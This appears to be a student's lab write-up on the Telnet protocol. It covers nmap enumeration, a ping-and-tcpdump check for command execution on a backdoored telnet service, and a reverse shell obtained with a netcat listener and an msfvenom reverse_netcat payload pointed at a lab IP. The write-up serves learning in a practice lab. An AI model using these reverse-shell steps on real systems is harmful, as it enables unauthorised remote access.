# Telnet

### What is it?

An **application protocol** that allows you to **connect** to and **execute commands** on a remote machine hosting a telnet server using a telnet client.

*Telnet has been replaced by SSH in most implementations since Telnet sends all messages in clear text with no encryption, no specific security mechanism.*

Connect using:
``telnet [ip] [port]``

## Enumerating Telnet

#### Port Scanning with Nmap

Without using -p- tag we get 0 open ports cos firewall. Use ``-Pn`` for stealth (will take longer tho).


## Exploiting Telnet

Telnet sends all communications over plaintext, lack of encryption.


#### CVE or Common Vulnerabilities and Exposures

We know from the enumeration stage:
  1. Poorly hidden telnet service
  2. backdoor
  3. username Skidy
  
Using this information to access telnet port, and use it to get full reverse shell.

### 1. Connecting to Telnet

``telnet [ip] [port]``

**Reverse shell**

-> A **shell** is a piece of code or program used to gain code or command execution on device.

-> A **reverse shell** is a type of shell where target machine communicates back to attacking machine.
  - The attacking machine has a listening port, receiving the connection and resulting in code or command execution.

First we check if what we're typing is being executed as system commands:

1. Start tcpdump listener on local machine - ``sudo tcpdump ip proto \\icmp -i eth0`` (if using openVPN use tun0 instead of eth0).
2. Ping from telnet session - ``.RUN ping 10.10.46.47 -c 1``

*Received ping on listener so system commands executed on telnet session are working.*

Generate reverse shell payload using **msfvenom** on local machine, this will generate and encode netcat reverse shell for us.

![image](https://user-images.githubusercontent.com/80155116/111870127-ba3de000-89e7-11eb-9b89-de7a2a8055d1.png)

Start **netcat listener** on local machine:

``nc -lvp 4444``

Copy paste the **msfvenom** payload and run it in telnet session:

``.RUN msfvenom -p cmd/unix/reverse_netcat lhost=10.10.64.206 lport=4444 R``

Now we get this!!!

![image](https://user-images.githubusercontent.com/80155116/111870231-5962d780-89e8-11eb-8a41-59ce475e2f5e.png)

